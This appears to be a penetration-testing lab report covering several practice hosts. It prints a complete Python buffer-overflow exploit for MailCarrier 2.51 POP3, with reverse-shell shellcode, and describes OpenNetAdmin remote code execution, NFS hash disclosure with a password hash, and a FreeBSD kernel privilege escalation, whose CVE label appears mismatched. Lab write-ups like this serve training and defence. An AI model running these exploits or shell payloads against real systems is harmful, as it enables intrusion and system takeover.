### Server IP Address	Ports Open
192.168.55.89	TCP:21,80,135,139,445,1978,1979,1980,8089 
![image](https://user-images.githubusercontent.com/9059079/121094122-18df5280-c7bc-11eb-9257-056ea3723c60.png)
  ```
A vulnerability in the exacqVision Enterprise System Manager (ESM) v5.12.2 application whereby unauthorized privilege escalation can potentially be achieved. This vulnerability impacts exacqVision ESM v5.12.2 and all prior versions of ESM running on a Windows operating system. This issue does not impact any Windows Server OSs, or Linux deployments with permissions that are not inherited from the root directory. Authorized Users have ‘modify’ permission to the ESM folders, which allows a low privilege account to modify files located in these directories. An executable can be renamed and replaced by a malicious file that could connect back to a bad actor providing system level privileges. A low privileged user is not able to restart the service, but a restart of the system would trigger the execution of the malicious file. This issue affects: Exacq Technologies, Inc. exacqVision Enterprise System Manager (ESM) Version 5.12.2 and prior versions; This issue does not affect: Exacq Technologies, Inc. exacqVision Enterprise System Manager (ESM) 19.03 and above.
```

### System IP: 192.168. 55.103
![image](https://user-images.githubusercontent.com/9059079/121094160-2dbbe600-c7bc-11eb-93b2-6ae00a92cac8.png)
Vulnerability Explanation:  CVE-2019–11395, Win10 MailCarrier version 2.51 POP3 User remote buffer overflow exploit. https://www.exploit-db.com/exploits/47554
Vulnerability Fix: No more version with patch. Should remove it from OS. 
Proof of Concept Code Here: 
# Exploit Title: Win10 MailCarrier 2.51 - 'POP3 User' Remote Buffer Overflow
# Date: 2019-10-01
# Author: Lance Biggerstaff
# Original Exploit Author: Dino Covotsos - Telspace Systems
# Vendor Homepage: https://www.tabslab.com/
# Version: 2.51
# Tested on: Windows 10

#!/usr/bin/python

import sys
import socket
import time

#msfvenom -p windows/shell/reverse_tcp lhost=IP_ADDRESS lport=LISTENING_PORT -b '\x00\xd9' -f python

buf =  b""
buf += b"\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xf4\x88\x6f\xbe\x83\xee\xfc\xe2\xf4\x08\x60"
buf += b"\xe0\xbe\xf4\x88\x0f\x8f\x26\x01\x8a\xda\x7f\xda\x5f"
buf += b"\x35\xa6\x84\xe4\xec\xe0\x87\xd8\xf4\xd2\xb9\x90\x35"
buf += b"\x86\xa0\x5e\x7e\x58\xb4\x0e\xc2\xf6\xa4\x4f\x7f\x3b"
buf += b"\x85\x6e\x79\xbd\xfd\x80\xec\x7f\xda\x7f\x35\xb6\xb4"
buf += b"\x38\xbf\x24\x03\x2f\xc6\x71\x48\x1b\xf2\xf5\x58\xe4"
buf += b"\xe6\xd4\xd8\x6e\x6d\x7f\xc0\x77\x3b\x3d\xfc\x53\x8f"
buf += b"\x0b\xc1\xe4\x8a\x7f\x89\xb9\x8f\x34\x24\xae\x71\xf9"
buf += b"\x89\xa8\x86\x14\xfd\x9b\xbd\x89\x70\x54\xc3\xd0\xfd"
buf += b"\x8f\xe6\x7f\xd0\x4b\xbf\x27\xee\xe4\xb2\xbf\x03\x37"
buf += b"\xa2\xf5\x5b\xe4\xba\x7f\x89\xbf\x37\xb0\xac\x4b\xe5"
buf += b"\xaf\xe9\x36\xe4\xa5\x77\x8f\xe6\xab\xd2\xe4\xac\x1d"
buf += b"\x08\x90\x41\x0b\xd5\x07\x8d\xc6\x88\x6f\xd6\x83\xfb"
buf += b"\x5d\xe1\xa0\xe0\x23\xc9\xd2\x8f\xe6\x56\x0b\x58\xd7"
buf += b"\x2e\xf5\x88\x6f\x97\x30\xdc\x3f\xd6\xdd\x08\x04\xbe"
buf += b"\x0b\x5d\x05\xb4\x9c\x48\xc7\xad\xc3\xe0\x6d\xbe\xe5"
buf += b"\xd4\xe6\x58\xa4\xd8\x3f\xee\xb4\xd8\x2f\xee\x9c\x62"
buf += b"\x60\x61\x14\x77\xba\x29\x9e\x98\x39\xe9\x9c\x11\xca"
buf += b"\xca\x95\x77\xba\x3b\x34\xfc\x65\x41\xba\x80\x1a\x52"
buf += b"\x1c\xef\x6f\xbe\xf4\xe2\x6f\xd4\xf0\xde\x38\xd6\xf6"
buf += b"\x51\xa7\xe1\x0b\x5d\xec\x46\xf4\xf6\x59\x35\xc2\xe2"
buf += b"\x2f\xd6\xf4\x98\x6f\xbe\xa2\xe2\x6f\xd6\xac\x2c\x3c"
buf += b"\x5b\x0b\x5d\xfc\xed\x9e\x88\x39\xed\xa3\xe0\x6d\x67"
buf += b"\x3c\xd7\x90\x6b\x77\x70\x6f\xc3\xdc\xd0\x07\xbe\xb4"
buf += b"\x88\x6f\xd4\xf4\xd8\x07\xb5\xdb\x87\x5f\x41\x21\xdf"
buf += b"\x07\xcb\x9a\xc5\x0e\x41\x21\xd6\x31\x41\xf8\xac\x60"
buf += b"\x3b\x84\x77\x90\x41\x1d\x13\x90\x41\x0b\x89\xac\x97"
buf += b"\x32\xfd\xae\x7d\x4f\x78\xda\x1c\xa2\xe2\x6f\xed\x0b"
buf += b"\x5d\x6f\xbe"

jmpesp = '\x23\x49\xA1\x0F'

# buffer length depends on length of source ip address, 5095 works for xxx.xxx.xx.x, you may need to tweak the length up or down
#buffer = '\x41' * 5093  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
buffer = '\x41' * 5094  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)



#buffer = '\x41' * 5095  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
#buffer = '\x41' * 5096  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
#buffer = '\x41' * 5097  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)

print "[*] MailCarrier 2.51 POP3 Buffer Overflow in USER command\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(("192.168.55.103", 2110))
print s.recv(1024)
s.send('USER ' + buffer + '\r\n')
print s.recv(1024)
s.send('QUIT\r\n')
s.close()
time.sleep(1)
print "[*] Done, but if you get here the exploit failed!"
            

Proof Screenshot Here:
 
Proof.txt Contents:
fb13963c4fdbfe2454937b590165799c
Additional screenshot:
nmap –sV –sC –oA nmap 192.168.55.103 
![image](https://user-images.githubusercontent.com/9059079/121094216-475d2d80-c7bc-11eb-8cc0-40d5aacdb8d2.png)

Found pop3 server with MailCarrier2.51 by the NC  192.168.55.103 2110 
Search for Mailcarrier2.51 from the searchexploit and found Remote Buffer Overflow in "USER" command(POP3)
![image](https://user-images.githubusercontent.com/9059079/121094271-5f34b180-c7bc-11eb-9900-5bee4496ba4a.png)
Started building Attack code and create Windows Reverse TCP Payload first as being suggested by the exploit code. 

![image](https://user-images.githubusercontent.com/9059079/121094284-678cec80-c7bc-11eb-9346-0d98c8ad9941.png)
![image](https://user-images.githubusercontent.com/9059079/121094291-69ef4680-c7bc-11eb-8db6-16081260ed13.png)

The buffer length needs to be adjusted because of the length of IP address. Mine needs 5094 - 192.168.19.55
![image](https://user-images.githubusercontent.com/9059079/121094301-6f4c9100-c7bc-11eb-87db-4a79b26d786c.png)
Open the Multi handler of Meatasploit to receive the reverse connection. 

![image](https://user-images.githubusercontent.com/9059079/121094318-75db0880-c7bc-11eb-9193-a1201dd27800.png)

Run the developed python attack code against the target. 
 
Got the proof.txt

### System IP: 192.168. 55.104

![image](https://user-images.githubusercontent.com/9059079/121094337-7f647080-c7bc-11eb-9d5c-9b69ad80fc45.png)
```Additional info about where the initial shell was acquired from
Vulnerability Explanation: OpenNetAdmin 18.1.1 - Remote Code Execution
OpenNetAdmin is a Network Management application that provides a database of managed inventory of IPs, subnets, and hosts in a network with a centralized AJAX web interface. The application is an Opensource written in PHP; you can view the source code on GitHub “ONA Project.”
https://medium.com/r3d-buck3t/remote-code-execution-in-opennetadmin-5d5a53b1e67
Vulnerability Fix: Patch available. 
Severity: High
Proof of Concept Code Here: 
https://github.com/amriunix/ona-rce
Local.txt Proof Screenshot:
```
![image](https://user-images.githubusercontent.com/9059079/121094393-930fd700-c7bc-11eb-9060-9b94b8c9a707.png)
51ecb2048af0f06309f970402b0a6920

Given nmap, 80, 85 and 8080 for Web had been scanned by gobuster and nikto and visited http://192.168.55.104/webdemo which is OPENETADMIN
gobuster dir -u http://192.168.55.104 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
![image](https://user-images.githubusercontent.com/9059079/121094415-9dca6c00-c7bc-11eb-92b4-0c1786858162.png)
![image](https://user-images.githubusercontent.com/9059079/121094421-a02cc600-c7bc-11eb-9b85-c96b5ae09dda.png)

All pages had been visited and turned out webdemo page is OpenNetAdmin version 18.1.1 
Search for the exploit from searchexploit and found the Remote Code Execution exploit. 
![image](https://user-images.githubusercontent.com/9059079/121094452-ad49b500-c7bc-11eb-8de6-07bbbe15799b.png)
Search the exploit code on github: https://github.com/amriunix/ona-rce
Ran it and got the shell. 
![image](https://user-images.githubusercontent.com/9059079/121094466-b20e6900-c7bc-11eb-85c9-5928a14d2b28.png)
Read local.txt as below
![image](https://user-images.githubusercontent.com/9059079/121094479-b6d31d00-c7bc-11eb-9dbf-2b3e4d607dc6.png)
![image](https://user-images.githubusercontent.com/9059079/121094489-b9357700-c7bc-11eb-9dff-3f021b461bd8.png)
![image](https://user-images.githubusercontent.com/9059079/121094493-baff3a80-c7bc-11eb-8200-d628fca28d80.png)

### System IP: 192.168.55.106
![image](https://user-images.githubusercontent.com/9059079/121094520-c6eafc80-c7bc-11eb-9d5f-34193cf5cf27.png)
```
Vulnerability Explanation: Anonymous NFS shares and Backup File Disclosure. Misconfiguration to share the sensitive Blakely DB containing SHA512crypt password. Brute
Vulnerability Fix: N/A
Severity: N/A
Proof of Concept Code Here: 
Mount: 192.168.55.106:/var/backup/spwd.db
```
![image](https://user-images.githubusercontent.com/9059079/121094540-ceaaa100-c7bc-11eb-97a9-eb1b8ce099b1.png)
![image](https://user-images.githubusercontent.com/9059079/121094549-d23e2800-c7bc-11eb-95e1-b622d46d1003.png)
![image](https://user-images.githubusercontent.com/9059079/121094573-d8cc9f80-c7bc-11eb-86d2-60dc877ec05e.png)
![image](https://user-images.githubusercontent.com/9059079/121094581-dbc79000-c7bc-11eb-90e5-b455c8c8d7eb.png)
![image](https://user-images.githubusercontent.com/9059079/121094585-de29ea00-c7bc-11eb-92c8-c4ec9c63699b.png)
```
      Read the spwd.db with VIM and found the interesting information for user, Frank with sha512crypt hash which usually used on Linux Password hash.
frank^@$6$12lZME5AbCMhVKwN$0lGJiPW9rlH0bxQBL4JCdQGLd4KAuoWKxr26ZTRC/tTGnM8RTRNJUwW78K.r0KBw.s7r2OoYqbQM6hNyOI1eb1
```
![image](https://user-images.githubusercontent.com/9059079/121094594-e4b86180-c7bc-11eb-885d-9b69906bade7.png)
![image](https://user-images.githubusercontent.com/9059079/121094601-e71abb80-c7bc-11eb-98f3-ee4eea8101f2.png)
![image](https://user-images.githubusercontent.com/9059079/121094607-e8e47f00-c7bc-11eb-8c83-7bb8d61f6fbb.png)
![image](https://user-images.githubusercontent.com/9059079/121094615-ebdf6f80-c7bc-11eb-8318-759650c43afb.png)

```
Vulnerability Exploited: Kernel Local Privilege Escalation 
Vulnerability Explanation:  CVE-2020-1749, Exploits a race and use-after-free vulnerability in the FreeBSD kernel IPv6 socket handling. A missing synchronization lock in the IPV6_2292PKTOPTIONS option handling in setsockopt permits racing ip6_setpktopt access to a freed ip6_pktopts struct. This exploit overwrites the ip6po_pktinfo pointer of a ip6_pktopts struct in freed memory to achieve arbitrary kernel read/write.
https://packetstormsecurity.com/files/158695/FreeBSD-ip6_setpktopt-Use-After-Free-Privilege-Escalation.html
Vulnerability Fix: Patched. 
```
![image](https://user-images.githubusercontent.com/9059079/121094630-f39f1400-c7bc-11eb-98cd-858913c0e7ed.png)
![image](https://user-images.githubusercontent.com/9059079/121094648-f8fc5e80-c7bc-11eb-92c5-e05d9edc7bb7.png)
![image](https://user-images.githubusercontent.com/9059079/121094655-fb5eb880-c7bc-11eb-9b56-df9ea405b9bd.png)

![image](https://user-images.githubusercontent.com/9059079/121094667-fdc11280-c7bc-11eb-9ef5-1f92c9f2d510.png)
![image](https://user-images.githubusercontent.com/9059079/121094679-00236c80-c7bd-11eb-849e-391113196fa4.png)
![image](https://user-images.githubusercontent.com/9059079/121094693-0285c680-c7bd-11eb-9aed-266e832bb26a.png)









![image](https://user-images.githubusercontent.com/9059079/121094563-d5391880-c7bc-11eb-9912-ffef75ad7b7f.png)


